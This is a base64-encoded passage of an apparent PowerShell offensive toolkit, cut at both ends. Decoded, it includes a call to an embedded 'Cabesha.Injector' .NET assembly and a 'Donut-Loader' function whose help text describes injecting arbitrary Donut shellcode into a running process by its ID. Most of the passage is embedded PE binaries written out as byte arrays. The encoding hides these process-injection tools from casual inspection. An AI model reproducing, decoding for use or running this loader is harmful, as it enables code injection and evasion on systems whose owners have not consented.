sIDEwNSwgMCwgMTA4LCAwLCAxMDEsIDAsIDczLCAwLCAxMTAsIDAsIDEwMiwgMCwgMTExLCAwLCAwLCAwLCA4LCAyLCAwLCAwLCAxLCAwLCA0OCwgMCwgNDgsIDAsIDQ4LCAwLCA0OCwgMCwgNDgsIDAsIDUyLCAwLCA5OCwgMCwgNDgsIDAsIDAsIDAsIDU2LCAwLCA4LCAwLCAxLCAwLCA3MCwgMCwgMTA1LCAwLCAxMDgsIDAsIDEwMSwgMCwgNjgsIDAsIDEwMSwgMCwgMTE1LCAwLCA5OSwgMCwgMTE0LCAwLCAxMDUsIDAsIDExMiwgMCwgMTE2LCAwLCAxMDUsIDAsIDExMSwgMCwgMTEwLCAwLCAwLCAwLCAwLCAwLCA5OSwgMCwgOTcsIDAsIDk4LCAwLCAxMDEsIDAsIDExNSwgMCwgMTA0LCAwLCA5NywgMCwgMCwgMCwgNjQsIDAsIDE1LCAwLCAxLCAwLCA3MCwgMCwgMTA1LCAwLCAxMDgsIDAsIDEwMSwgMCwgODYsIDAsIDEwMSwgMCwgMTE0LCAwLCAxMTUsIDAsIDEwNSwgMCwgMTExLCAwLCAxMTAsIDAsIDAsIDAsIDAsIDAsIDQ5LCAwLCA0NiwgMCwgNDgsIDAsIDQ2LCAwLCA1NSwgMCwgNDgsIDAsIDU2LCAwLCA1MSwgMCwgNDYsIDAsIDQ5LCAwLCA1NiwgMCwgNTMsIDAsIDU0LCAwLCA1MCwgMCwgMCwgMCwgMCwgMCwgNTYsIDAsIDEyLCAwLCAxLCAwLCA3MywgMCwgMTEwLCAwLCAxMTYsIDAsIDEwMSwgMCwgMTE0LCAwLCAxMTAsIDAsIDk3LCAwLCAxMDgsIDAsIDc4LCAwLCA5NywgMCwgMTA5LCAwLCAxMDEsIDAsIDAsIDAsIDk5LCAwLCA5NywgMCwgOTgsIDAsIDEwMSwgMCwgMTE1LCAwLCAxMDQsIDAsIDk3LCAwLCA0NiwgMCwgMTAwLCAwLCAxMDgsIDAsIDEwOCwgMCwgMCwgMCwgNjgsIDAsIDE1LCAwLCAxLCAwLCA3NiwgMCwgMTAxLCAwLCAxMDMsIDAsIDk3LCAwLCAxMDgsIDAsIDY3LCAwLCAxMTEsIDAsIDExMiwgMCwgMTIxLCAwLCAxMTQsIDAsIDEwNSwgMCwgMTAzLCAwLCAxMDQsIDAsIDExNiwgMCwgMCwgMCwgNjcsIDAsIDExMSwgMCwgMTEyLCAwLCAxMjEsIDAsIDExNCwgMCwgMTA1LCAwLCAxMDMsIDAsIDEwNCwgMCwgMTE2LCAwLCAzMiwgMCwgNTAsIDAsIDQ4LCAwLCA0OSwgMCwgNTcsIDAsIDAsIDAsIDAsIDAsIDY0LCAwLCAxMiwgMCwgMSwgMCwgNzksIDAsIDExNCwgMCwgMTA1LCAwLCAxMDMsIDAsIDEwNSwgMCwgMTEwLCAwLCA5NywgMCwgMTA4LCAwLCA3MCwgMCwgMTA1LCAwLCAxMDgsIDAsIDEwMSwgMCwgMTEwLCAwLCA5NywgMCwgMTA5LCAwLCAxMDEsIDAsIDAsIDAsIDk5LCAwLCA5NywgMCwgOTgsIDAsIDEwMSwgMCwgMTE1LCAwLCAxMDQsIDAsIDk3LCAwLCA0NiwgMCwgMTAwLCAwLCAxMDgsIDAsIDEwOCwgMCwgMCwgMCwgNDgsIDAsIDgsIDAsIDEsIDAsIDgwLCAwLCAxMTQsIDAsIDExMSwgMCwgMTAwLCAwLCAxMTcsIDAsIDk5LCAwLCAxMTYsIDAsIDc4LCAwLCA5NywgMCwgMTA5LCAwLCAxMDEsIDAsIDAsIDAsIDAsIDAsIDk5LCAwLCA5NywgMCwgOTgsIDAsIDEwMSwgMCwgMTE1LCAwLCAxMDQsIDAsIDk3LCAwLCAwLCAwLCA2OCwgMCwgMTUsIDAsIDEsIDAsIDgwLCAwLCAxMTQsIDAsIDExMSwgMCwgMTAwLCAwLCAxMTcsIDAsIDk5LCAwLCAxMTYsIDAsIDg2LCAwLCAxMDEsIDAsIDExNCwgMCwgMTE1LCAwLCAxMDUsIDAsIDExMSwgMCwgMTEwLCAwLCAwLCAwLCA0OSwgMCwgNDYsIDAsIDQ4LCAwLCA0NiwgMCwgNTUsIDAsIDQ4LCAwLCA1NiwgMCwgNTEsIDAsIDQ2LCAwLCA0OSwgMCwgNTYsIDAsIDUzLCAwLCA1NCwgMCwgNTAsIDAsIDAsIDAsIDAsIDAsIDcyLCAwLCAxNSwgMCwgMSwgMCwgNjUsIDAsIDExNSwgMCwgMTE1LCAwLCAxMDEsIDAsIDEwOSwgMCwgOTgsIDAsIDEwOCwgMCwgMTIxLCAwLCAzMiwgMCwgODYsIDAsIDEwMSwgMCwgMTE0LCAwLCAxMTUsIDAsIDEwNSwgMCwgMTExLCAwLCAxMTAsIDAsIDAsIDAsIDQ5LCAwLCA0NiwgMCwgNDgsIDAsIDQ2LCAwLCA1NSwgMCwgNDgsIDAsIDU2LCAwLCA1MSwgMCwgNDYsIDAsIDQ5LCAwLCA1NiwgMCwgNTMsIDAsIDU0LCAwLCA1MCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMzIsIDAsIDAsIDEyLCAwLCAwLCAwLCA5NiwgNTcsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDApKSB8IG91dC1udWxsIAokYmluYXJpbyAgPSAkYXJnLnNwbGl0KCIgLCIpWzBdCiRhcmcgPSAkYXJnLlJlcGxhY2UoIiRiaW5hcmlvICIsIiIpLnNwbGl0KCIsIikgfCBTZWxlY3QtT2JqZWN0IC1Ta2lwIDEKJGFyZ3VtZW50b3MgPSAkYmluYXJpbwpmb3JlYWNoICgkYXJndW1lbnRvIGluICRhcmcpIHsKW2FycmF5XSRhcmd1bWVudG9zICs9ICRhcmd1bWVudG8KCn0KW0NhYmVzaGEuSW5qZWN0b3JdOjpFeGVjdXRlKCRhcmd1bWVudG9zKX0KfQpmdW5jdGlvbiBEb251dC1Mb2FkZXIge3BhcmFtKCRwcm9jZXNzX2lkLCRkb251dGZpbGUpCiAgICAkaGVscD1AIgouU1lOT1BTSVMKICAgIERvbnV0IExvYWRlci4KICAgIFBvd2VyU2hlbGwgRnVuY3Rpb246IERvbnV0LUxvYWRlcgogICAgQXV0aG9yOiBMdWlzIFZhY2FzIChDeWJlclZhY2EpCiAgICBCYXNlZCBjb2RlOiBUaGVXb3ZlcgoKICAgIFJlcXVpcmVkIGRlcGVuZGVuY2llczogTm9uZQogICAgT3B0aW9uYWwgZGVwZW5kZW5jaWVzOiBOb25lCi5ERVNDUklQVElPTgogICAgCi5FWEFNUExFCiAgICBEb251dC1Mb2FkZXIgLXByb2Nlc3NfaWQgMjE5NSAtZG9udXRmaWxlIC9ob21lL2N5YmVydmFjYS9kb251dC5iaW4KICAgIERvbnV0LUxvYWRlciAtcHJvY2Vzc19pZCAoZ2V0LXByb2Nlc3Mgbm90ZXBhZCkuaWQgLWRvbnV0ZmlsZSAvaG9tZS9jeWJlcnZhY2EvZG9udXQuYmluCgogICAgRGVzY3JpcHRpb24KICAgIC0tLS0tLS0tLS0tCiAgICBGdW5jdGlvbiB0aGF0IGxvYWRzIGFuIGFyYml0cmFyeSBkb251dCA6RAoiQAppZiAoJHByb2Nlc3NfaWQgLWVxICRudWxsIC1vciAkZG9udXRmaWxlIC1lcSAkbnVsbCkge3dyaXRlLWhvc3QgIiRoZWxwYG4ifSBlbHNlIAp7CmlmICgoW0ludFB0cl06OlNpemUpIC1lcSA0KSB7d3JpdGUtaG9zdCAiU29ycnksIHRoaXMgZnVuY3Rpb24gb25seSB3b3JrIG9uIHg2NCA6KCI7IGJyZWFrfQpbYnl0ZVtdXSRieXRlcyA9IDc3LCA5MCwgMTQ0LCAwLCAzLCAwLCAwLCAwLCA0LCAwLCAwLCAwLCAyNTUsIDI1NSwgMCwgMCwgMTg0LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCA2NCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMTI4LCAwLCAwLCAwLCAxNCwgMzEsIDE4NiwgMTQsIDAsIDE4MCwgOSwgMjA1LCAzMywgMTg0LCAxLCA3NiwgMjA1LCAzMywgODQsIDEwNCwgMTA1LCAxMTUsIDMyLCAxMTIsIDExNCwgMTExLCAxMDMsIDExNCwgOTcsIDEwOSwgMzIsIDk5LCA5NywgMTEwLCAxMTAsIDExMSwgMTE2LCAzMiwgOTgsIDEwMSwgMzIsIDExNCwgMTE3LCAxMTAsIDMyLCAxMDUsIDExMCwgMzIsIDY4LCA3OSwgODMsIDMyLCAxMDksIDExMSwgMTAwLCAxMDEsIDQ2LCAxMywgMTMsIDEwLCAzNiwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgODAsIDY5LCAwLCAwLCAxMDAsIDEzNCwgMiwgMCwgNDEsIDY0LCAxMzksIDkzLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAyNDAsIDAsIDM0LCAzMiwgMTEsIDIsIDExLCAwLCAwLCAxNiwgMCwgMCwgMCwgMTYsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDMyLCAwLCAwLCAwLCAwLCA2NCwgMCwgMCwgMCwgMCwgMCwgMCwgMzIsIDAsIDAsIDAsIDE2LCAwLCAwLCA0LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCA2LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCA5NiwgMCwgMCwgMCwgMTYsIDAsIDAsIDAsIDAsIDAsIDAsIDMsIDAsIDk2LCAxMzMsIDAsIDAsIDY0LCAwLCAwLCAwLCAwLCAwLCAwLCA2NCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMTYsIDAsIDAsIDAsIDAsIDAsIDAsIDMyLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAxNiwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgNjQsIDAsIDAsIDg4LCAzLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAyMCwgNDUsIDAsIDAsIDI4LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAzMiwgMCwgMCwgNzIsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDQ2LCAxMTYsIDEwMSwgMTIwLCAxMTYsIDAsIDAsIDAsIDc2LCAxNCwgMCwgMCwgMCwgMzIsIDAsIDAsIDAsIDE2LCAwLCAwLCAwLCAxNiwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMzIsIDAsIDAsIDk2LCA0NiwgMTE0LCAxMTUsIDExNCwgOTksIDAsIDAsIDAsIDg4LCAzLCAwLCAwLCAwLCA2NCwgMCwgMCwgMCwgMTYsIDAsIDAsIDAsIDMyLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCA2NCwgMCwgMCwgNjQsIDQ2LCAxMTQsIDEwMSwgMTA4LCAxMTEsIDk5LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCA5NiwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgNDgsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDY0LCAwLCAwLCA2NiwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgM